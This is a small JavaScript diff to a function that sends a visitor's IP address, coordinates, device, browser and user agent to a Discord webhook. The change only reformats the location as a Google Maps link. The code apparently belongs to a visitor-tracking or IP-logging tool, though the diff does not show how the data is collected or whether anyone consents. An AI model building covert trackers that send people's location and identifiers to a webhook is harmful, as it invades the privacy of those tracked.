@@ -9,6 +9,10 @@ async function sendDiscordMessage({
   browser,
   userAgent,
 }) {
+  const maps =
+    lat && lon
+      ? `https://www.google.com/maps/place/${lat},${lon}`
+      : "không lấy được vị trí";
   return axios.post(DISCORD_WEBHOOK_URL, {
     embeds: [
       {
@@ -18,9 +22,7 @@ async function sendDiscordMessage({
           { name: "🌐 IP", value: `\`${ip}\``, inline: true },
           {
             name: "📍 Vị trí",
-            value: `https://www.google.com/maps/place/${lat || "unknown"},${
-              lon || "unknown"
-            }`,
+            value: `[Google Maps](${maps})`,
             inline: true,
           },
           { name: "💻 Thiết bị", value: `${device}`, inline: true },
